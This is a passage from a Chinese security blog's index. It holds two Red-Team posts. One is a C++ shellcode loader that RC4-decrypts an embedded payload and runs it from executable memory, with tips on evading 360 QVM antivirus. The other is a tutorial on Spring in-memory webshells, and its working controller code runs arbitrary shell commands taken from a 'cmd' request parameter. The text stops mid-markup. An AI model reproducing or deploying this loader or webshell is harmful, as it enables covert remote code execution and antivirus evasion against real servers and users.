sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void AES_enc(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void ToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    string data &#x3D; &quot;93bf58b44d4d8c000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241514....&quot;;</span><br><span class=\"line\">    ifstream ifs;</span><br><span class=\"line\">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class=\"line\">    if (ifs.is_open()) &#123;</span><br><span class=\"line\">        string line;</span><br><span class=\"line\">        getline(ifs, line);</span><br><span class=\"line\">        ifs.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    </span><br><span class=\"line\">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    ToBytes(data, buffer, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class=\"line\">    AES_enc(key, buffer);</span><br><span class=\"line\">    char* mypng &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(mypng, buffer, length);</span><br><span class=\"line\">    ((void(*) ())mypng)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h1><h2 id=\"添加资源\"><a href=\"#添加资源\" class=\"headerlink\" title=\"添加资源\"></a>添加资源</h2><p>绕过QVM</p>\n<p>加资源文件即可</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104631466.png\" alt=\"image-20240507104631466\"></p>\n<h2 id=\"vs配置免杀\"><a href=\"#vs配置免杀\" class=\"headerlink\" title=\"vs配置免杀\"></a>vs配置免杀</h2><p>主绕过QVM</p>\n<p><a href=\"https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw\">https://mp.weixin.qq.com/s/UJlVvagNjmy9E-B-XjBHyw</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181614551.png\" alt=\"image-20240505181614551\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181628246.png\" alt=\"image-20240505181628246\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181642420.png\" alt=\"image-20240505181642420\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181653701.png\" alt=\"image-20240505181653701\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181712675.png\" alt=\"image-20240505181712675\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505181809890.png\" alt=\"image-20240505181809890\"></p>\n","categories":["Red-Team"]},{"title":"JAVA内存马之二","url":"/2024/11/07/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%BA%8C)/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/feng.jpeg\" alt=\"feng\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接上篇，这篇学习框架内存马与Agent内存马，下篇学习内存马查杀</p>\n<p>环境：springboot 2.4.5</p>\n<h1 id=\"基于动态添加框架组件\"><a href=\"#基于动态添加框架组件\" class=\"headerlink\" title=\"基于动态添加框架组件\"></a>基于动态添加框架组件</h1><p>针对于框架有spring、springboot、weblogic等等，上一篇实现了基于Servlet API中的 Servlet、Filter、Listener的内存马实现，现在针对SpringMVC的Controller来进行内存马的学习，依旧根据上一篇的学习思路，从controller的实现原理开始学习</p>\n<blockquote>\n<p>在动态注册 Servlet 时，注册了两个东西，一个是 Servlet 的本身实现，一个 Servlet 与 URL 的映射 Servlet-Mapping，在注册 Controller 时，也同样需要注册两个东西，一个是 Controller，一个是 RequestMapping 映射。</p>\n</blockquote>\n<h2 id=\"Spring-Controller-内存马\"><a href=\"#Spring-Controller-内存马\" class=\"headerlink\" title=\"Spring Controller 内存马\"></a>Spring Controller 内存马</h2><h3 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p>环境：springboot-2.4.5</p>\n<p>针对前期springboot的bean的初始化流程不再分析，给出细致分析：<a href=\"https://blog.csdn.net/kangsa998/article/details/90056135\">Springboot 源码分析-bean 初始化流程</a></p>\n<p>给出Controller的demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/books&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BookController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getById</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;springboot is running&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;springboot is running&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>初始化时，针对容器内的bean进行构造方法，属性的初始化，然后使用到 AbstractAutowireCapableBeanFactory.java#initializeBean() 方法，针对每个bean调用了invokeInitMethods()，其中的一个实现类需要关注的是 <strong>RequestMappingHandlerMapping</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605135709591.png\" alt=\"image-20220605135709591\"></p>\n<p>然后判断是否继承 InitializingBean，然后调用afterPropertiesSet方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140133563.png\" alt=\"image-20220605140133563\"></p>\n<p>调用父类的afterPropertiesSet()方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140443515.png\" alt=\"image-20220605140443515\"></p>\n<p>跟踪到 AbstractHandlerMethodMapping.java#afterPropertiesSet，发现又调用了 <strong>initHandlerMethods()</strong></p>\n<p>根据注释就是从当前的application中扫描所有的beans</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605140904938.png\" alt=\"image-20220605140904938\"></p>\n<p>进入 <strong>processCandidateBean</strong>，获取bean的类型，然后通过 <strong>isHandler</strong> 进行判断</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605141920229.png\" alt=\"image-20220605141920229\"></p>\n<p>RequestMappingHandlerMapping#<strong>isHandler</strong> <strong>判断bean 是否带有 Controller 或 RequestMapping 注解</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605142111033.png\" alt=\"image-20220605142111033\"></p>\n<p>如果符合就返回到 <strong>detectHandlerMethods</strong> 中，这个方法实现的功能就是，通过一个map(method-&gt;info)然后进行注册映射。</p>\n<p>其中需要关注的两个方法 <strong>getMappingForMethod</strong> 和 <strong>registerHandlerMethod</strong>，分别是形成map和注册</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605180418607.png\" alt=\"image-20220605180418607\"></p>\n<p>跟进 <strong>getMappingForMethod</strong> ，发现主要为两步</p>\n<p>1、通过createRequestMappingInfo方法以当前控制器下的method作为变量，创建了一个<strong>RequestMappingInfo</strong> 的对象</p>\n<p>2、通过createRequestMappingInfo方法以当前控制器下的handlerType作为参数，创建了一个<strong>RequestMappingInfo</strong> 的对象</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605230532906.png\" alt=\"image-20220605230532906\"></p>\n<p><strong>createRequestMappingInfo</strong> 通过 findMergedAnnotation 去查询 handler 的 RequestMapping 类型的注解</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605230734303.png\" alt=\"image-20220605230734303\"></p>\n<p>然后调用双参数的 createRequestMappingInfo 添加 请求方法 路径等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605231626214.png\" alt=\"image-20220605231626214\"></p>\n<p> method 和 handlerType 返回值如下然后combine进行合并，最后返回 info</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605232156567.png\" alt=\"image-20220605232156567\"></p>\n<p>然后进入一个循环</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605233444545.png\" alt=\"image-20220605233444545\"></p>\n<p>跟进 <strong>registerHandlerMethod</strong>，调用 MappingRegistry 类的 <strong>register</strong> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605234443461.png\" alt=\"image-20220605234443461\"></p>\n<p>可以看见一开始就定义了一些变量，这些就是最终存储的位置</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605235542675.png\" alt=\"image-20220605235542675\"></p>\n<p><strong>register()</strong> 一开始都是铺垫，最后添加到 registry 中，最终利用点就是这个register方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220605235755096.png\" alt=\"image-20220605235755096\"></p>\n<p>此时map对应的 路径-&gt;方法，至此，controller的注册流程完成</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606000530484.png\" alt=\"image-20220606000530484\"></p>\n<p>那么一次http请求路由是怎么查找到对应的controller的？</p>\n<p><a href=\"https://www.cnblogs.com/w-y-c-m/p/8416630.html\">SpringMVC源码之Controller查找原理 - 卧颜沉默 - 博客园 (cnblogs.com)</a></p>\n<p>其中有一个方法是用于动态注册的：<strong>registerMapping()</strong></p>\n<p>看注释也能知道，当初始化完成后，可以调用该方法进行动态注册，因为调用了register方法，这也是下文用于注册controller的利用调用处，还有另外几种方法，见下面的参考</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606225504008.png\" alt=\"image-20220606225504008\"></p>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>思路：</p>\n<ul>\n<li>创建一个恶意 RequestMappingInfo 对象，实现其方法，请求路径</li>\n<li>通过容器获取上下文，然后获取 RequestMappingHandlerMapping</li>\n<li>通过调用 registerMapping <strong>等</strong>方法进行注册controller</li>\n</ul>\n<p>ShellController</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintWriter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">Inject</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取InjectController的method</span></span><br><span class=\"line\">        Method method = InjectController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        InjectController injectToController = <span class=\"keyword\">new</span> InjectController();</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;[+]success: /shell&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InjectController</span></span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InjectController</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取request</span></span><br><span class=\"line\">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\">            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class=\"line\">            PrintWriter writer = response.getWriter();</span><br><span class=\"line\">            <span class=\"comment\">//cmd参数</span></span><br><span class=\"line\">            String cmd = request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Scanner c = (<span class=\"keyword\">new</span> Scanner(p.start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next() : o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                response.sendError(<span class=\"number\">404</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/inject&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">inject</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获得 RequestMappingHandlerMapping 的实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 3. 通过反射获得自定义 controller 中的 Method 对象</span></span><br><span class=\"line\">        Method method = InjectToController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/demo&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        InjectToController injectToController = <span class=\"keyword\">new</span> InjectToController();</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info, injectToController, method);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InjectToController</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InjectToController</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 获取request</span></span><br><span class=\"line\">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">            InputStream is = Runtime.getRuntime().exec(request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class=\"line\">            InputStreamReader isr = <span class=\"keyword\">new</span> InputStreamReader(is, <span class=\"string\">&quot;GBK&quot;</span>);</span><br><span class=\"line\">            BufferedReader br = <span class=\"keyword\">new</span> BufferedReader(isr);</span><br><span class=\"line\">            String str = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            String line = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((line = br.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">                str+=line;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            is.close();</span><br><span class=\"line\">            br.close();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606235323859.png\" alt=\"image-20220606235323859\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220607010606558.png\" alt=\"image-20220607010606558\"></p>\n<p>其中的注意点：</p>\n<p>1、springboot 2.6.0后有个新特性，添加了 pathPatternsCondition 导致 手动注册controller报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Expected lookupPath in request attribute &quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2、关于注册controller</p>\n<p>还有好几种的接口可以实现调用register方法进行添加 registry，参见 <a href=\"https://www.anquanke.com/post/id/198886#h3-8\">基于内存 Webshell 的无文件攻击技术研究</a></p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>利用场景可将其转为jsp文件，或通过反序列化来注入内存马比如fastjson，CC链</p>\n<p>加入fastjson 1.2.24</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 